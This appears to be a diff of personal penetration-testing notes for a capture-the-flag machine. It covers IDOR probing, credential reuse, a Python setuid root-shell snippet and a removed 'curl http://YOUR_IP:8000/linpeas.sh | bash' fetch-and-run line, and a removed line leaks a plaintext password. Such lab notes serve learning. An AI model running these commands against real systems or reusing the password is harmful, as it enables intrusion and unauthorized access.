@@ -36,8 +36,14 @@ nmap -sU -F $IP // if got stuck
 
 
 ## Web & Foothold
-*IDOR and pcap*
-Do not forget negative values and zero during enumeration
+
+**The Flaw (IDOR):** The site used predictable paths like `/download/12` and `/view/5`.
+
+> 💡 **Tip:** Always test `0`, `-1`, and `9999`.
+
+
+IDOR -> leaked creds -> FTP -> SSH reuse 
+
 Add:
 
 ```
@@ -53,19 +59,11 @@ Observe object references:
 /view/5
 Try:0 -1 9999 other users
 ```
-## Enumeration
-_Per-service findings. Web dirs, SMB shares, versions, default creds tried._
-
-Ports found: FTP, SSH, Web 
 
 **FTP**
 `anonymous:` failed, pw required
 found vstfp 3.0.3, quick check, not vulnerable
 
-## Foothold
-_How you got the initial shell. Exploit used, payload, command run._
-
-IDOR -> leaked creds -> FTP -> SSH reuse 
 
 
 ## Privilege Escalation
@@ -112,40 +110,19 @@ os.setuid(0);
 os.system('sh')
 ```
 
-**Key insight:** 
-
-## Loot
-- PASS:Buck3tH4TF0RM3!
-
 ## Lessons
-_5 minutes. What did you learn? What would you do faster next time? What did you NOT know going in?_
 
-1. Some Linux Hacks
-```bash
-During LinPeas, open another SSH window to poke around,
-in fact, poke around during scan, dun waste time
+- **Don't Waste Time:** While LinPeas is running or Nmap is scanning, open a second SSH window and start manually poking around the application folders (`/opt`, `/var/www`).
+    
+- **Web Fuzzing Strategy:** Use an "Adaptive DFS" method. Make a quick list of pages to check, go one by one, and if you hit a rabbit hole, note it down and move to the next. Only fuzz deep if everything else fails.
+    
+- **Be Fast with Tools:** Know exactly where your files are locally:
+    
+```  bash
+sudo updatedb && locate linpeas.sh
 ```
-2. The Enum techniques,  adaptive DFS: 
-```bash
-List all of the pages to explore, go one by one, stop when felt like its a rabbit hole and note down if all other didnt work out, come back to exploit with this method (fuzz)
-```
-3. Be familiar where my tools are, LinPea.sh, and be familar with the commands:
-```bash
-// to use an exploit on the server
-cp /usr/share/peass/linpeas/linpeas.sh .
-python3 -m http.server 8000
 
-// then on the target
-curl http://YOUR_IP:8000/linpeas.sh | bash
-mv ~/Downloads .
-```
-4. To find something:
-```bash
-sudo updatedb
-locate linpeas.sh
-```
-## Links to techniques
-_Link to `Techniques/` notes for anything reusable._
+
 
 **Web Application**
 
@@ -163,8 +140,3 @@ _Link to `Techniques/` notes for anything reusable._
 | phpMyAdmin        | DB admin                | Weak creds                        |
 
 
-
-## References
-_Writeups, IppSec video, exploit-db links._
-
-- IppSec video
